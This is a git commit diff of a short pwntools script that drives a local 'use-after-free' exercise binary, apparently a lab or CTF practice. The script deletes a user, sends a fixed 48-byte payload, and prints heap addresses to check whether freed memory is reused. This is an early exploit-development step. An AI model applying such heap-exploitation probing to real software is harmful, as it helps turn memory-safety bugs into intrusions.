73b5aaaceae64a6746e699f78010bdb70c8c5408
ChoKyuWon <yyj10137@gmail.com>
2020-06-18 13:49:25 +0900

    script

--- uaf.py
+++ uaf.py
@@ -2,20 +2,17 @@ from pwn import *
 
 target = "use-after-free"
 
-for i in range(100):
-    p = process(target)
+p = process(target)
 
-    payload = b"a"*i
+payload = b"a"*48
 
-    p.recvuntil(">>>")
-    p.sendline("delete-user")
-    p.recvuntil(':')
-    p.sendline("Kim")
-    del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
-    p.sendline("msg")
-    print(p.recvuntil(":"))
-    p.sendline(payload)
-    msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
-    print(del_addr, msg_addr)
-#gdb.attach(p)
-#interactive()
+p.recvuntil(">>>")
+p.sendline("delete-user")
+p.recvuntil(':')
+p.sendline("Kim")
+del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
+p.sendline("msg")
+print(p.recvuntil(":"))
+p.sendline(payload)
+msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
+print(del_addr, msg_addr)
